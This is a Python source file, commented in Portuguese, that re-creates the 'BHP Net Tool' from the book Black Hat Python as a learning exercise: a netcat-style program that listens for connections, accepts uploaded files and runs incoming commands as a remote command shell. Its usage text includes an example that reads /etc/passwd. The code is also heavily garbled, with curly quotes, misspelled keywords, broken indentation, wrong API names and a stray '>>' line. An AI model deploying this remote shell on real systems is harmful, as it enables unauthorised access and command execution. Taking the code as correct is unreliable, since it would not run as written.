# socket_netcat.py
Socket desenvolvido pelo aprendizado do livro Black Hat Python


#importando socket e funções

import sys, socket, getopt, threading, subprocess

#definindo algumas variaveis globais

listen = False
command = False
upload = False
execute = False
target = False
upload_destination = False
port = 0


def usage():
	print “BHP Net Tool”
	print
	print “Para usar: socket_netcat.py -t target_host -p port”
	print “- l --listen 	- listen on [host]:[port] para entrada de conexões”
	print “- e --execute=file_to_run -executa conexão”
	print “-c -- comand - inicia o comando shell”
	print “-u --upload=destination - recebe conexão upload [destination]”
	print	
	print
	print “Examples: “
	print “socket_netcat.py -t ip -p 5555 -l -c”
print “socket_netcat.py -t ip -p 5555 -l -u=c:\\target.exe”
print “socket_netcat.py -t ip -p 5555 -l -e=\ “cat /etc/passwd\”
print “echo ‘ABCDEFGH’ | ./socket_netcat.py -t ip ip 135”

def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

#lê as opções de linha de comando

#defiine variaveis integradas de acordo com opções detectadas.
try:

	opts, args = getopt.getop(sys.argv[1:],”hle:t:p:cu:”, [“help”, “listen”, “execute”, “target”, “port”, “command”, “upload”])
expect getopt.GetoptError as err:
	print str(err)
	usage()

for o,a in opts:
	if o in (“-h”, “--help”):
		usage()
	elif o in (“-l”, “--listen”):
		listen = True
	elif o in (“-e”, “--execute”):
		execute = a
	elif o in (“-c”, “--commandshell”):
		command = True
	elif o in (“-t”, “--target”):
		target = a
	elif o in (“-p”, “--port”):
		port = int(a)
	else:
		asserts False, “Unhandled Option”

# para ouvir ou enviar dados de stdin

if not listen and len(target) and port > 0:

	# ve o buffer da linha de comando
	# isso causará um bloqueio, envie CTRL -D
 	# enviando dados de entrada para stdin

	buffer = sys.stdin.read()

	#send data off
	client_sender(buffer)

	
	#ouviremos a porta
	# fazendo upload de dados, executando shell

	if listen:
		server_loop()

main()

 	# configurando socket para ouvir rede e carregar novos comandos

	def client_sender(buffer):

		client = socket.socket(socket.AF_INET, socket.SOCKET_STREAM)

		try:

			#conectando ao host alvo

			client.connect((target, port))

>>

		if  len(buffer):
			client.send(buffer)

		while True:

			data = client.recv(4096)
			recv_len = len(data)
			response+= data

			if recv_len < 4096:
				break

		print response,
		
		#espera mais dados de entrada
		
		buffer = raw_input(“”)
		buffer += “\n”

		# envia os dados

		client.send(buffer)

except:

	print “[*] Exception! Exiting.”

	# encerra a conexao
	
	client.close()

#vamos criar um laço principal do servidor, com função stub

def server_loop():

	global target

	# se nao tiver alvo definido, ouviremos todas as interfaces

	if not len(target):
		target = “0.0.0.0”

	server = socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
	server.bind((target,port))
	server.listen(5)

	while True:

		client_socket, addr = server.accept()

		#dispara uma thread para cuidar do novo cliente
	
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()

def run_command(command):

		#remove a quebra de linha

		command = command.rstrip()
		
		#executa o comando e obtém os dados de saída

		try:

			output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)

		except:

			output = “Failed to execute command.\r\n”

	#envia os dados de saida de volta ao cliente

	return output

#implementando a logica para fazer upload de aquivos e executar comandos no shell

def client_handler(client_scoket):

	global upload	
	global execute
	global command
	
	#verifica se é upload
	if len(upload_destination):

		#le todos os bytes e grava no destino
		file_buffer = “ “

		#permanece lendo os dados ate que nao haja mais nenhum disponivel
		while True:
			data = client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data


		#para gravar esses bytes

		try:
			file_descriptor = open(upload_destination, “wb”)
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			#confirma que gravou o arquivo
			client_socket.send(“Successfully saved file to %s\r\n” % upload_destination)

		except:
			client_socket.send(“Failed to save file to %s\r\n” % upload_destination)

		#verifica execucao de comando
		if len(execute):

			#executa o comando
			 output = run_command(execute)

			client_socket.send(output)

# entra em outro laço se um shell de comandos foi solicitado

if command:
	while True:
		#mostra um prompt simples
		client_socket.send(“<BHP:#> “)
			
			#recebe dados até ver o linefeed
			(tecla enter)
		cmd_buffer = “”
		while “\n” not in cmd_buffer:
			cmd_buffer += client_socket.recv(1024)

		#envia de volta a saída de comando
		response = run_command(cmd_buffer)
		
		#envia de volta a resposta
		client_socket.send(response)




